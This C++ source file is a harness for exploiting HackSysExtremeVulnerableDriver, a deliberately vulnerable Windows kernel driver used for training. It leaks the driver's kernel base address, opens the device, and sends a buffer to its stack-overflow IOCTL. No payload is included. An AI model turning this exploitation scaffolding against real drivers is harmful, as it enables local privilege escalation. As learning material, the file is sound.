/**
 * HackSysExtremeVulnerableDriver exploit pack consisting of all of the possible
 * exploits against that vulnerable driver. To be used in learning process of 
 * Windows Kernel Exploitation journey. 
 *
 * Intended to be run under: Windows 7 SP1 x86, English
 * 
 * Compilation:
 *		cmd> g++ -g3 -m32 -std=c++11 -Wall exploit.cpp -lntdll -o exploit.exe
 * 
 * Mariusz B. / mgeeky.
 *
**/

#include "common.h"
#include <memory>


using namespace std;


DWORD 
GetModuleImageBase(
	const wstring &imageNameParam
) {

	static const size_t Max_Number_Of_Modules = 1000;
	static const wstring ending(L".sys");	

	wstring imageName(imageNameParam);
	transform(imageName.begin(), imageName.end(), imageName.begin(), ::tolower);
	
	if(!equal(ending.rbegin(), ending.rend(), imageName.rbegin())) {
		imageName += ending;
	}
	
	shared_ptr<RTL_PROCESS_MODULES> modulesInfo(
		new RTL_PROCESS_MODULES[Max_Number_Of_Modules]
	);
	
	if(!modulesInfo.get()) {
		wcerr << L"[!] Could not allocate memory for modulesInfo!" << endl;
		return 0;
	}
	
	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 
		modulesInfo.get(), 
		sizeof(RTL_PROCESS_MODULES) * Max_Number_Of_Modules, 
		NULL
	);
	
	if(!NT_SUCCESS(status)) {
		wcerr << L"[!] Could not obtain list of loaded driver modules! Status: 0x" 
			<< hex << setfill(L'0') << setw(8) << status << endl;
		return 0;
	}
	
	for(size_t i = 0; i < modulesInfo->NumberOfModules; i++ ) {
		
		const DWORD imageBase = modulesInfo->Modules[i].ImageBase;
		const char *moduleImageNamePointer = reinterpret_cast<const char*>(
			modulesInfo->Modules[i].FullPathName 
			+ modulesInfo->Modules[i].OffsetToFileName);
			
		const string moduleImageName(moduleImageNamePointer);

		wstring moduleImageNameWide(moduleImageName.begin(), moduleImageName.end());
		transform(
			moduleImageNameWide.begin(), 
			moduleImageNameWide.end(), 
			moduleImageNameWide.begin(), 
			::tolower);
			
		if(imageName == moduleImageNameWide) {
			wcout << L"[+] Found " << imageName << L" driver's base: 0x" 
				<< hex << setfill(L'0') << setw(8) << imageBase << endl;
			return imageBase;
		}
	}
	
	wcerr << L"[!] Could not find the " << imageName 
		<< L" module among the loaded modules." << endl;
	
	return 0;
}


BOOL 
SendIOCTL(
	DWORD ioctlCode, LPVOID inputBuffer, DWORD inputSize, 
	LPVOID outputBuffer, DWORD outSize, LPDWORD writtenBytes
) {
	
	auto ioctl = g_ioctlCodeNames.find(static_cast<IOCTL_CODES>(ioctlCode));
	if ( ioctl != g_ioctlCodeNames.end()) {
		wcout << L"[+] Issuing IOCTL: " << ioctl->second << endl;
	}
	
	DWORD written;
	bool ownAllocation = false;
	LPDWORD writtenPtr = (writtenBytes != nullptr)? writtenBytes : &written;
	
	if (inputBuffer == nullptr) {
		ownAllocation = true;
		inputBuffer = VirtualAlloc ((LPVOID)0,
									inputSize,
									MEM_COMMIT | MEM_RESERVE,
									PAGE_EXECUTE_READWRITE	
		);
		
		if (inputBuffer == nullptr) {
			wcout << L"[!] Could not allocate memory for " << inputSize << L" bytes! Error: " 
					<< GetLastError() << endl;
			throw runtime_error("allocation error");
		}
	}
	
	wcout << hex << setw(8) << setfill(L'0')
			<< L"[.] Input buffer: 0x" << inputBuffer
			<< L", size: " << inputSize << L" bytes. Output: 0x" 
			<< outputBuffer << endl;
			
	BOOL ret = DeviceIoControl(*g_driverHandle, 
								ioctlCode,
								inputBuffer,
								inputSize,
								outputBuffer,
								outSize,
								writtenPtr,
								NULL
	);
	
	wcout << hex << setw(8) << setfill(L'0')
			<< L"[>] After sending IOCTL. ret: " << ((ret)? L"TRUE" : L"FALSE")
			<< L", last error: " << GetLastError() << L", written bytes: " 
			<< *writtenPtr << endl << endl;
	
	return ret;
}


int 
main(
	int argc, char** argv
) {
	
	wcout << L"HackSysExtremeVulnerableDriver" << endl;
	wcout << L"Local Privilege Escalation exploit's pack'" << endl;
	wcout << L"Mariusz B. / mgeeky, '17" << endl << endl;
	
	shared_ptr<HANDLE> driverHandle(new HANDLE(
		CreateFileW(
			L"\\\\.\\HackSysExtremeVulnerableDriver", 
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
			NULL
	)),
	[](const HANDLE *ptr) {
		if( *ptr != (HANDLE)INVALID_HANDLE_VALUE && ptr != nullptr) {
			CloseHandle(*ptr);
		}
		delete ptr;
	});
	
	if( *driverHandle == static_cast<HANDLE>(INVALID_HANDLE_VALUE)) {
		wcerr << L"[!] Could not open \\Device\\HackSysExtremeVulnerableDriver driver's handle. Error: 0x" 
			<< GetLastError() << endl;
		return 1;
	}
	
	g_driverHandle = move(driverHandle);
	
	wcout << L"[+] Opened HackSysExtremeVulnerableDriver driver's handle." << endl;
	
	if(!(g_hevdDriverImageBase = GetModuleImageBase(L"HEVD"))) {
		wcout << "[!] Could not acquire HEVD driver's 'image base." << endl;
		return 1;
	}

	SendIOCTL(HACKSYS_EVD_IOCTL_STACK_OVERFLOW, nullptr, 100);
	
	return 0;
}
